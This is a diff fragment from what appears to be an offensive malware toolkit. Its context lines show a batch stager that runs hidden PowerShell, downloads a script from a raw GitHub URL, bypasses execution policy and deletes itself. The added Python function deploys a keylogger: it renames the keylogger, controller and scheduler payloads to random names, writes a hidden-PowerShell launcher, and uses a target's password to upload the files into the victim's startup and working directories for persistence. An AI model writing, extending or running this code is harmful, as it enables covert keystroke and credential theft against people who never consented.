@@ -82,3 +82,32 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 powershell powershell.exe -windowstyle hidden -ep bypass ./Installer.ps1
 @REM self delete
 @REM del wget.cmd
+
+
+##code for main.py
+#########################################
+def keylogger(address, target_password, working_dir, startup_dir):
+    keylogger = (f"{local_path}/payloads/keylogger.ps1")
+    controller = (f"{local_path}/payloads/c.cmd")
+    scheduler = (f"{local_path}/payloads/l.ps1")
+
+    # obfuscated files
+    obfuscated_controller = random_text() + ".cmd"
+    obfuscated_keylogger = random_text() + ".ps1"
+    obfuscated_scheduler = random_text() + ".ps1"
+
+    with open(obfuscated_controller, "w") as f:
+        f.write("@echo off")
+        f.write(f"powershell Start-Process powershell.exe -windowstyle hidden \"{working_dir}/\"")
+
+            
+
+    #file staging 
+    os.system(f"cp {controller} {local_path}/{obfuscated_controller}")
+    os.system(f"cp {keylogger} {local_path}/{obfuscated_keylogger}")
+    os.system(f"cp {scheduler} {local_path}/{obfuscated_scheduler}")
+
+    #remote upload
+    remoteupload(address, target_password, obfuscated_controller, startup_dir) #for controller
+    remoteupload(address, target_password, obfuscated_keylogger, working_dir) #for Keylogger
+    remoteupload(address, target_password, obfuscated_scheduler, working_dir) #for scheduler
